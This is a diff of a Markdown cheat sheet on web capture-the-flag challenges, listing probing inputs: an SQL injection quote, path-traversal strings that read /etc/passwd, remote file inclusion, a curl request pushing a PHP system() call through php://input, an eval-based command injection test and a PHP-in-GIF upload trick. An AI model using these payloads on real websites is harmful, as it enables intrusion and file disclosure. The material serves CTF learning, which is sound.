@@ -9,27 +9,40 @@ A good clue where to start is to look out for:
     `?page=index`
 
     Here you have to manually try to enter some stuff to understand more about the application.
-    * `?id='` => SQL error, okay probably a sql injection. ID are often sql injections
-    * `?page[]=` => Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.
-    * `?id=-1` => Try negative numbers
-    * `?page=../../../../etc/passwd` => LFI
-    * `?page=../html/index` => If you the above line does not work. Try this as you could be dealing with a limited local file inclusion.
+    * `?id='`
+            Test for SQL injection
+    * `?page[]=`
+            Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.
+    * `?id=-1`
+            Try negative numbers
+    * `?page=../../../../etc/passwd`
+            Local file inclusion (LFI)
+    * `?page=../html/index`
+            If you the above line does not work. Try this as you could be dealing with a limited local file inclusion.
+        The code could look like this in php:
         ```php
         <?php
             include $_GET['page'] . '.php';
         ```
-    * `?page=http://remote-file.js` => RFI
+    * `?page=http://remote-file.js`
+            Remote file inclusion
 
-    * `?page=%252e%252e%252fetc%252fpasswd` => Double encoding + LFI
+    * `?page=%252e%252e%252fetc%252fpasswd`
+            Double encoding + LFI
 
-    * `$ curl -d "AAAA1234" -X POST http://URL/?magic=php://input` => If you see AAAA1234 in the data => LFI using PHP Wrappers.
+    * `$ curl -d "<?=system('ls .')" -X POST http://URL/?magic=php://input`
+            Send a arbitrary payload through a post request
+
 * Hidden form input
     ```html
     <input type="hidden" name ="debug" />
     ```
     I would try the same stuff as the GET parameter previously described. Also:
-    * Try enter `5*5`. If it returns `25` =>  `command injection`.
-
+    * `?exec=5*5`
+            If it returns `25` we have  `command injection`.
+            Backend is probably running :
+            
+            eval($_GET['exec'])`
 
 * Commented out links
     ```html
@@ -48,7 +61,8 @@ A good clue where to start is to look out for:
     gifsicle < mygif.gif -- comment "<?=phpversion();?>" > output.php.gif
     ```
 
-* Money transfer => These are often a `timing attack`
+* Money transfer
+        These are often a `timing attack`
 
 * Clues in the name/title of the challenges
 
@@ -71,7 +85,10 @@ A good clue where to start is to look out for:
 
 * Nullbyte
 
-* LFI / RFI (PHP Wrappers) => I recommend this page from [rawsec](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/)
+    PHP Version < 5.3.4
+
+* LFI / RFI (PHP Wrappers)
+        I recommend this page from [rawsec](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/)
 
 ##### Well.. I've found nothing
 
@@ -338,6 +355,7 @@ Use your favorite `fuzzer`. Here are some good ones:
 
 * /dev/random - Might sometimes return nullbyte(\00)
 
+* Shell in another challenge? Use it for recon
 
 Sources of inspiration:
 * https://github.com/JohnHammond/ctf-katana/blob/master/README.md
